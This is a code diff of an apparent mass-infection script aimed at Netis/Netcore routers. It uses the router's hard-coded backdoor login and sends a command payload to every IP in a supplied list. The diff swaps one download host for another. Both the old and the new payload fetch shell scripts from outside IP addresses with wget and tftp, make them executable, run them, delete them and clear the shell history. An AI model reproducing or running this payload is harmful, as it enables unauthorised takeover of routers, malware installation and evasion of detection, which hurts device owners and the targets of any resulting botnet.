@@ -9,7 +9,7 @@ if len(sys.argv) < 2:
         sys.exit()
 
 loginpayload = "AAAAAAAAnetcore\x00"
-commandpayload = "AA\x00\x00AAAA cd /tmp; wget http://167.88.114.40/w.sh;chmod 777 w.sh;sh w.sh;tftp 167.88.114.40 -c get t.sh;chmod 777 t.sh;sh t.sh;rm -rf w.sh t.sh;history -c"
+commandpayload = "AA\x00\x00AAAA cd /tmp; wget http://84.200.81.239/hiddenbin/stardust.sh;chmod 777 stardust.sh;sh stardust.sh;tftp 167.88.114.40 -c get t.sh;chmod 777 t.sh;sh t.sh;rm -rf stardust.sh t.sh;history -c"
 list = open(sys.argv[1], "r").readlines()
 offline = 0
 class netis(threading.Thread):
